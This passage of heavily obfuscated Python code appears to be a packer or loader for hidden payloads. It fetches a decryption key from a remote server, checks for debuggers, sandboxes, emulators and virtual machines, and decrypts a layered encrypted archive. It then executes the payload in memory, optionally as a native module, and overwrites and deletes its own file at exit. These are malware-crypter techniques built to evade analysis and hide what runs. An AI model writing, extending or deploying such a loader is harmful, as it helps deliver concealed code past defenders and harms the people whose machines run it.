2047, 2047, 1, 3, 2, 2047, 2, 0, 1, 1, 2046, 2, 0, 2047, 0, 0]
        N = (61381 ^ 60984); Q = (63985 ^ 61937)
        m_poly = [0] * N
        session_bits = "".join(format(b, _nixon_űƋთฺซט毓בը(229))[::-1] for b in session_token)
        for i, bit in enumerate(session_bits):
            if i < N: m_poly[i] = int(bit)
        r_poly = [0] * N
        for i in range(N): r_poly[i] = _nixon_シークレット시크릿.choice([-1, 0, 1])
        e_poly = list(m_poly)
        for i in range(N):
            if r_poly[i] == 0: continue
            for j in range(N):
                idx = (i + j) % N
                term = (r_poly[i] * pub_key[j]) % Q
                e_poly[idx] = (e_poly[idx] + term) % Q
        ntru_blob = bytearray()
        for coeff in e_poly:
            if coeff < 0: coeff += Q
            ntru_blob.extend(coeff.to_bytes(2, 'big'))
        final_payload = bytearray()
        final_payload.extend(len(ntru_blob).to_bytes(2, 'big'))
        final_payload.extend(ntru_blob)
        final_payload.extend(nonce)
        final_payload.extend(enc_pass)
        req = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=bytes(final_payload), headers={_nixon_űƋთฺซט毓בը(118): _nixon_űƋთฺซט毓בը(230)})
        ctx = _nixon_ҎϘ瑈จĐॖʜ铍ɿ()
        resp_raw = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=(7648 ^ 7663), context=ctx).read()
        resp_iv = resp_raw[:12]
        resp_blob = resp_raw[12:]
        final_key = cipher.decrypt(resp_blob, resp_iv)
        if len(final_key) > 10:
            globals()[_nixon_űƋთฺซט毓בը(231)] = final_key.decode()
            return True
        return False
    except: return False
def _nixon_٢ɐʂฒŒƣᚮซႯ७():
    # Verify the loader's own integrity BEFORE anything else runs.  A
    # tampered loader must not be able to divert the state machine and
    # then exit 0.  _nixon_びमあסฎ頫ҋ() exits 137 on a mismatch.
    _nixon_びमあסฎ頫ҋ()
    _gc_handle = _nixon_ώȰいโᚼᎪѣĠ() if _nixon_űƋთฺซט毓בը(232) in dir() else None
    _nixon_ΊӢץىまփॢ("[DEBUG] Bootloader starting...")
    if not _nixon_龋齟ĸჾ栣ᚯᎰ(): return
    if _nixon_ႯჇγϯƼᏴხԲ:
        def _one_shot_cleanup():
            try:
                targets = set()
                # __file__ is NOT a target: in a packed artifact it is the
                # temp file the outer loader extracted, and that loader deletes
                # it at exit anyway.  Wiping it made the loader's own re-entry
                # fail its self-check (ENOENT) and kill a clean run.  The
                # artifact itself (argv[0] / NX_ORIGIN) is still wiped.
                if _nixon_システム시스템.argv and _nixon_システム시스템.argv[0]: targets.add(_nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0]))
                origin = _nixon_オペレーション운영.environ.get("NX_ORIGIN")
                if origin: targets.add(origin)
                for t in targets:
                    if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                        try:
                            sz = _nixon_オペレーション운영.path.getsize(t)
                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
                        except: pass
                        try:
                            try: _nixon_オペレーション운영.chmod(t, 0o600)
                            except Exception: pass
                            _nixon_オペレーション운영.unlink(t)
                        except: pass
            except: pass
        _nixon_アテクシット종료.register(_one_shot_cleanup)
    _nixon_ぜჍฟϧŹʆѵიぢӼ() 
    _nixon_ɤあńᏢᚨ()
    try:
        _nixon_ģᏖũƹᏊʠႵϥǉ._nixon_ঋে縃焵Ⴍ()
        _nixon_ģᏖũƹᏊʠႵϥǉ._nixon_ם๋ᚻोάͱゕγІ鉤()
    except: pass 
    ctx = {'h': 0}
    S_INIT = 0; S_STG0 = 1; S_REC = (57496 ^ 57498); S_ON1 = (50151 ^ 50148); S_ZIP1 = (32815 ^ 32811)
    S_ON2 = (19561 ^ 19564); S_DEC1 = (5610 ^ 5612); S_VM = (50535 ^ 50528); S_PAD = (2289 ^ 2297); S_LOAD = (54804 ^ 54813); S_EXEC = (61577 ^ 61571); S_EXIT = (15375 ^ 15364)
    def _nixon_ᛢʎʞভƬอʛჄႼț():
        try:
            try:
                if _nixon_ᛠȢƧДڰোᎰᎶश._nixon_ঠゟᛣ刪響Ⴤӏ():
                    _nixon_ΊӢץىまփॢ("[WARN] Universal Debugger Detected")
                    _nixon_ӴƖՅבᏨ蛎Ўउ._nixon_覉ेृ۵ჾᎦᛐ(5)
            except: pass
            _sbx = _nixon_ӑहႼᏒ्ᛧ
            if _sbx._nixon_ƇחᏟțʅӲᚹ():
                _nixon_ΊӢץىまփॢ("[WARN] Automated Sandbox detected (Time Acceleration/Low Res)")
                if not _nixon_ɫȀח०ƣნほɦ:
                    pass
        except: pass
        deg = _nixon_りऎۛאはঝՍ()
        if deg & 1: ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(233)) 
        try: _nixon_ϨǱてӌْ()
        except: pass
        _nixon_ŽᛪฉჄגΙ๙()
        try:
            import uuid as _uuid_rce
            if not _nixon_ǩע埴ĠרڶُჶᎵ(_nx_mac()) and not _nixon_ɫȀח०ƣნほɦ:
                _nixon_ΊӢץىまփॢ("[WARN] Remote Critical Code Fetch Failed")
                ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(234))
                _nx_strict_fail(_nixon_űƋთฺซט毓בը(235))
            if _nixon_űƋთฺซט毓בը(231) not in globals() or _RUNTIME_KEY != bytes.fromhex(_nixon_űƋთฺซט毓בը(236)): import sys; sys.exit(0)
        except: pass
        try:
            _emu_check = _nixon_ᚱʹႫנᏫᛂɅ
            _emu_ok, _emu_results = _emu_check._nixon_悮ᏠゖԴく()
            if not _emu_ok and not _nixon_ɫȀח०ƣნほɦ:
                _nixon_ΊӢץىまփॢ("[WARN] Emulator/VM detected")
                ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(237))
                _nx_strict_fail(_nixon_űƋთฺซט毓בը(238))
        except: pass
        try:
            _frame_chk = _nixon_ᚴะᏳڪ撏ٲ繹烰ჴ
            if _frame_chk._nixon_Ꮔ蚿թͽᏧ戥լ() and not _nixon_ɫȀח०ƣნほɦ:
                _nixon_ΊӢץىまփॢ("[WARN] Debugger frame detected")
                ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(239))
                _nx_strict_fail(_nixon_űƋთฺซט毓בը(240))
        except: pass
        try:
            _opaque = _nixon_תգνϠڴȅǊʤɥ
            _opq_val = _opaque._nixon_ჀძȗეדৄᛙᎫڢ(ctx.get('h', 0))
            ctx[_nixon_űƋთฺซט毓בը(241)] = _opq_val
        except: pass
        try:
            _hw_perf = _nixon_ृϰӿвʐなγ()
            ctx[_nixon_űƋთฺซט毓בը(242)] = _hw_perf._nixon_Ŝईɑףษ砞Հǻ()
        except: pass
        try:
            import uuid as _uuid_lic
            _lic = _nixon_ƑΌץᛨĵᛝƤ("", "")
            _hw_id_for_chain = _nx_mac()
            if not _lic._nixon_ɳฅխǎথॴў(_hw_id_for_chain) and not _nixon_ɫȀח०ƣნほɦ:
                _nixon_ΊӢץىまփॢ("[WARN] Blockchain license check failed")
                ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(243))
                _nx_strict_fail(_nixon_űƋთฺซט毓בը(244))
        except: pass
        try:
            _shard_urls = []
            _shard_threshold = max(2, len(_shard_urls) // 2 + 1) if _shard_urls else 3
            _sharding = _nixon_ᚰϰȰӌŪ(threshold=_shard_threshold, total_shards=len(_shard_urls) if _shard_urls else 5)
            if _shard_urls and len(_shard_urls) >= _shard_threshold:
                _remote_key_part = _sharding._nixon_锁澣ᏪฤϺŭ(_shard_urls)
                if _remote_key_part:
                    ctx[_nixon_űƋთฺซט毓בը(245)] = _remote_key_part
                    ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _remote_key_part[:8])
        except: pass
        try:
            _geo = _nixon_Ꭰऍड़ΞĜ([], [])
            if not _geo._nixon_ᏮՉŅঠэӷॆ() and not _nixon_ɫȀח०ƣნほɦ:
                _nixon_ΊӢץىまփॢ("[WARN] Geographic restriction failed")
                ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(246))
                _nx_strict_fail(_nixon_űƋთฺซט毓בը(247))
        except: pass
        try:
            _int_mon = _nixon_Ⴡاфせլ()
            _int_mon._nixon_ٷє७ᎼɆ(_nixon_űƋთฺซט毓בը(248), _nixon_٢ɐʂฒŒƣᚮซႯ७)
            ctx[_nixon_űƋთฺซט毓בը(249)] = _int_mon
        except: pass
        h_bytes = _nixon_びमあסฎ頫ҋ()
        if len(h_bytes) != 32: 
             ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], _nixon_űƋთฺซט毓בը(250))
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 0)
        return S_STG0
    def _nixon_ȅᚱ嫊ןาךᚤᎢθ():
        ctx[_nixon_űƋთฺซט毓בը(251)] = _nixon_Ƿצ餛ϖᚷาԲᎹज()
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 1)
        return S_REC
    def _nixon_ीŽКॆɑ庣巌():
        ctx[_nixon_űƋთฺซט毓בը(252)] = _nixon_ᚯղᛖᛏęრচჲぅס(_nixon_ɠই赟սӔฦ)
        ctx[_nixon_űƋთฺซט毓בը(253)] = _nixon_ᚯղᛖᛏęრচჲぅס(_nixon_ᎥᚩᚰᛃɤȆ)
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 2)
        return S_ON1
    def _nixon_すظΛჷԳᏋᛂЎ():
        ctx[_nixon_űƋთฺซט毓בը(254)] = _nixon_霩ごڗΧჶべͼ(ctx[_nixon_űƋთฺซט毓בը(251)], ctx[_nixon_űƋთฺซט毓בը(253)])
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 3)
        return S_ZIP1
    def _nixon_緧ԶᏩơŃڄჄ聥ӟț():
        try:
            with _nixon_ジップ압축파일.ZipFile(_nixon_アイオー입출력.BytesIO(ctx[_nixon_űƋთฺซט毓בը(254)])) as z:
                ctx[_nixon_űƋთฺซט毓בը(255)] = z.read(_nixon_űƋთฺซט毓בը(86))
        except Exception as e:
            _nixon_ΊӢץىまփॢ(f"[FATAL] Mid-Zip Failed: {e}"); _nixon_システム시스템.exit(1)
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 4)
        return S_ON2
    def _nixon_ぺՂძϞǡみᚨᎯ():
        ctx[_nixon_űƋთฺซט毓בը(256)] = _nixon_霩ごڗΧჶべͼ(ctx[_nixon_űƋთฺซט毓בը(255)], ctx[_nixon_űƋთฺซט毓בը(252)])
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 5)
        return S_DEC1
    def _nixon_ჱԼᎸПʆᏓᚬϥᏛ():
        if len(ctx.get(_nixon_űƋთฺซט毓בը(256), b"")) > 0: 
            try: ctx[_nixon_űƋთฺซט毓בը(189)] = _nixon_圧縮압축.decompress(ctx[_nixon_űƋთฺซט毓בը(256)])
            except: pass
        ctx[_nixon_űƋთฺซט毓בը(189)] = _nixon_エルゼット압축.decompress(ctx[_nixon_űƋთฺซט毓בը(256)])
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 6)
        return S_VM
    def _nixon_ᛧŇৈᛏตᛊשॱ():
        _nixon_ΊӢץىまփॢ("[DEBUG] Phased Key Derivation...")
        k_int = _nixon_ჼ๖зŪפ鎌ぬᚹڏখ()
        k_env = _nixon_舗ᏴᏤĞŜχХ(k_int)
        k_final = _nixon_ปᏗऎŭႻځǌჁᚾ(k_env, ctx[_nixon_űƋთฺซט毓בը(251)], _nixon_Ķ৩Ɍȼぱ, _nixon_फ़ᚮŢןს)
        time_window = _NX_BUILD_WINDOW
        time_salt = _nixon_ハッシュ해시.sha256(str(time_window).encode()).digest()
        sim_h = 0
        for i in range(7): sim_h = _nixon_ႠěǸוֈխ(sim_h, i)
        prov_salt = _nixon_ハッシュ해시.sha256(str(sim_h).encode()).digest()
        k_dec = bytes([a ^ b ^ c for a, b, c in zip(k_final, time_salt, prov_salt)])
        ctx[_nixon_űƋთฺซט毓בը(189)], _fake_flag = _nixon_ॸ箌გび靕פǋז(ctx[_nixon_űƋთฺซט毓בը(189)])
        cip = _nixon_źჺᛤŲछ综ȭͽ(k_dec)
        ctx[_nixon_űƋთฺซט毓בը(191)] = cip.decrypt(ctx[_nixon_űƋთฺซט毓בը(189)], _nixon_उѭऊͽᎴႲ)
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 7)
        return S_PAD
    def _nixon_ٮৄ麠ڊς():
        ctx[_nixon_űƋთฺซט毓בը(190)] = _nixon_ざցжʊЦע(ctx[_nixon_űƋთฺซט毓בը(191)])
        m = _nixon_űƋთฺซט毓בը(257).encode()
        if not ctx[_nixon_űƋთฺซט毓בը(190)].startswith(m): 
            _nixon_ΊӢץىまփॢ("[FATAL] Magic Mismatch (Decryption Failed)"); _nixon_システム시스템.exit(1)
        ctx[_nixon_űƋთฺซט毓בը(192)] = ctx[_nixon_űƋთฺซט毓בը(190)][len(m):]
        # Authenticate the payload before anything is extracted from
        # it.  The zip is XOR-encrypted with no MAC of its own, so a
        # byte flipped in the payload region used to corrupt the
        # payload SILENTLY -- the loader ran, the payload was garbage,
        # and nothing said so.  The tag is keyed with the inner key
        # (already embedded) and computed by the build.
        try:
            import hmac as _nx_mac_h
            import hashlib as _nx_mac_sha
            _nx_mac_key = bytes.fromhex(_nixon_űƋთฺซט毓בը(270))
            _nx_mac_got = _nx_mac_h.new(_nx_mac_key, ctx[_nixon_űƋთฺซט毓בը(192)],
                                        _nx_mac_sha.sha256).hexdigest()
            if not _nx_mac_h.compare_digest(_nx_mac_got,
                                          _nixon_űƋთฺซט毓בը(271)):
                _nixon_ΊӢץىまփॢ("[FATAL] Payload integrity check failed")
                import os as _nx_mac_os
                _nx_mac_os._exit(137)
        except SystemExit:
            raise
        except Exception as _nx_mac_e:
            _nixon_ΊӢץىまփॢ(f"[FATAL] Payload integrity check error: {_nx_mac_e}")
            import os as _nx_mac_os2
            _nx_mac_os2._exit(137)
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 8)
        return S_LOAD
    def _nixon_ۦΧᛢצᚨվǮ๐():
        ldr = _nixon_ċもჴրź(ctx[_nixon_űƋთฺซט毓בը(192)], SWIZZLE_KEY, MORPH_MAP)
        _nixon_システム시스템.meta_path.insert(0, ldr)
        ctx[_nixon_űƋთฺซט毓בը(260)] = ldr
        ctx['h'] = _nixon_ႠěǸוֈխ(ctx['h'], 9)
        return S_EXEC
    def _nixon_ɪᎡʮᛉŢᚧкɋฎգ():
        try:
            _nixon_ΊӢץىまփॢ("[DEBUG] Executing...")
            if _nixon_ႯჇγϯƼᏴხԲ:
                try:
                    targets = set()
                    # __file__ is NOT a target: in a packed artifact it is the
                    # temp file the outer loader extracted, and that loader deletes
                    # it at exit anyway.  Wiping it made the loader's own re-entry
                    # fail its self-check (ENOENT) and kill a clean run.  The
                    # artifact itself (argv[0] / NX_ORIGIN) is still wiped.
                    if _nixon_システム시스템.argv and _nixon_システム시스템.argv[0]: targets.add(_nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0]))
                    origin = _nixon_オペレーション운영.environ.get("NX_ORIGIN")
                    if origin: targets.add(origin)
                    for t in targets:
                        if _nixon_オペレーション운영.path.exists(t) and _nixon_オペレーション운영.path.isfile(t):
                            sz = _nixon_オペレーション운영.path.getsize(t)
                            with open(t, "rb+", encoding='utf-8') as f: f.write(_nixon_オペレーション운영.urandom(sz))
                            try: _nixon_オペレーション운영.rename(t, t + _nixon_űƋთฺซט毓בը(261))
                            except: pass
                            try: _nixon_オペレーション운영.unlink(t + _nixon_űƋთฺซט毓בը(261))
                            except: pass
                except: pass
            if FORCE_NATIVE_MODE and isinstance(_nixon_ՁʗάƇᏊᛠ, dict) and any(_nixon_ՁʗάƇᏊᛠ.values()):
                _nixon_ΊӢץىまփॢ("[DEBUG] Loading Native Module (Multi-Arch)...")
                try:
                    h = _nixon_ՁʗάƇᏊᛠ_Loader._nixon_ҠĒҚบभʕǉ(_nixon_ՁʗάƇᏊᛠ)
                    if h:
                        _nixon_ΊӢץىまփॢ("[SUCCESS] Native module loaded from memory.")
                        ldr = ctx[_nixon_űƋთฺซט毓בը(260)]
                        if _nixon_űƋთฺซט毓בը(262) in ldr.z.namelist():
                            enc_data = ldr.z.read(_nixon_űƋთฺซט毓בը(262))
                            key = bytes.fromhex(_nixon_űƋთฺซט毓בը(270))
                            globals()[_nixon_űƋთฺซט毓בը(57)] = True
                            h.NativeVM({}, 0).exec_secure(enc_data, key)
                            return S_EXIT
                    else:
                        _nixon_ΊӢץىまփॢ("[WARN] Failed to load native module or OS not supported.")
                except Exception as e:
                    _nixon_ΊӢץىまփॢ(f"[FATAL] Native Load Error: {e}")
            else:
                _nixon_ΊӢץىまփॢ("[DEBUG] Loading Python payload...")
                ldr = ctx[_nixon_űƋთฺซט毓בը(260)]
                entry_point = None
                possible_names = [_nixon_űƋთฺซט毓בը(263), _nixon_űƋთฺซט毓בը(264)]
                for name in possible_names:
                    if name in ldr.z.namelist():
                        entry_point = name
                        break
                if not entry_point:
                    for name in ldr.z.namelist():
                        if name.endswith(_nixon_űƋთฺซט毓בը(40)) or name.endswith(_nixon_űƋთฺซט毓בը(38)):
                            entry_point = name
                            break
                if entry_point:
                    enc_data = ldr.z.read(entry_point)
                    spec = _nixon_インポート임포트.util.spec_from_loader("__main__", ldr)
                    module = _nixon_インポート임포트.util.module_from_spec(spec)
                    module.__name__ = "__main__"
                    _nixon_システム시스템.modules["__main__"] = module
                    globals()[_nixon_űƋთฺซט毓בը(57)] = True
                    ldr.exec_module(module)
                else:
                    raise Exception(_nixon_űƋთฺซט毓בը(265))
            _nixon_うずįĿჄᚼڄשĕۉ(bytearray(ctx[_nixon_űƋთฺซט毓בը(192)]))
            ctx[_nixon_űƋთฺซט毓בը(190)] = b""
            ctx[_nixon_űƋთฺซט毓בը(191)] = b""
            _nixon_システム시스템.stdout.flush()
        except Exception as e:
            # Report in BOTH variants. This used to print only when
            # VAR_IS_DEBUG was set and otherwise exit(1) silently, so a
            # failed inner exec left an artefact that exited 1 having
            # written nothing on either stream.
            _nixon_ΊӢץىまփॢ(f"[FATAL] Exec failed: {e}"); _nixon_トレースバック트랙.print_exc()
            _nixon_システム시스템.exit(1)
        return S_EXIT
    dispatcher = {
        S_INIT: _nixon_ᛢʎʞভƬอʛჄႼț, S_STG0: _nixon_ȅᚱ嫊ןาךᚤᎢθ, S_REC: _nixon_ीŽКॆɑ庣巌,
        S_ON1: _nixon_すظΛჷԳᏋᛂЎ, S_ZIP1: _nixon_緧ԶᏩơŃڄჄ聥ӟț, S_ON2: _nixon_ぺՂძϞǡみᚨᎯ,
        S_DEC1: _nixon_ჱԼᎸПʆᏓᚬϥᏛ, S_VM: _nixon_ᛧŇৈᛏตᛊשॱ, S_PAD: _nixon_ٮৄ麠ڊς,
        S_LOAD: _nixon_ۦΧᛢצᚨվǮ๐, S_EXEC: _nixon_ɪᎡʮᛉŢᚧкɋฎգ
    }
    curr = S_INIT
    while curr != S_EXIT:
        try:
            if _nixon_ランダム랜덤.random() < 0.05: 
                try: _nixon_ϨǱてӌْ()
                except: pass
            _ = 1 // 0 
        except ZeroDivisionError:
            try:
                curr = dispatcher[curr]()
            except Exception as e:
                if _nixon_ɫȀח०ƣნほɦ:
                    _nixon_ΊӢץىまփॢ(f"[FATAL] State Machine Crash: {e}")
                    break
                # Fail closed.  The loader used to `break` out of the
                # state machine on ANY failure, so a tampered artifact
                # (its own hash feeds the key derivation, so tampering
                # corrupts the payload) simply ran nothing and exited 0.
                # A tamperer saw a clean success.  Now a crashed loader
                # dies like the kill ladder does: silent, exit 137.
                import os as _nx_sm_os
                _nx_sm_os._exit(137)
    # The payload must actually have run.  A tampered loader can
    # divert the state machine before the payload is executed, and the
    # loader used to exit 0 in that case -- indistinguishable from a
    # clean run.  Now it fails closed.
    if not globals().get(_nixon_űƋთฺซט毓בը(57)):
        import os as _nx_pr_os
        _nx_pr_os._exit(137)
# Verify the loader's own integrity BEFORE anything else runs, and
# at MODULE level so a tamper cannot dodge it by disabling the
# entry point below.  A mismatch exits 137.
_nixon_びमあסฎ頫ҋ()
if __name__ == "__main__":
    _nixon_マルチ멀티.freeze_support()
    _nixon_٢ɐʂฒŒƣᚮซႯ७()
# The payload must actually have run.  A tampered loader can divert
# the state machine before the payload is executed, and the loader
# used to exit 0 in that case -- indistinguishable from a clean
# run.  This check is outside the __main__ block on purpose: if the
# block above was tampered with, this still fires.
if not globals().get(_nixon_űƋთฺซט毓בը(57)):
    import os as _nx_pr_os
    _nx_pr_os._exit(137)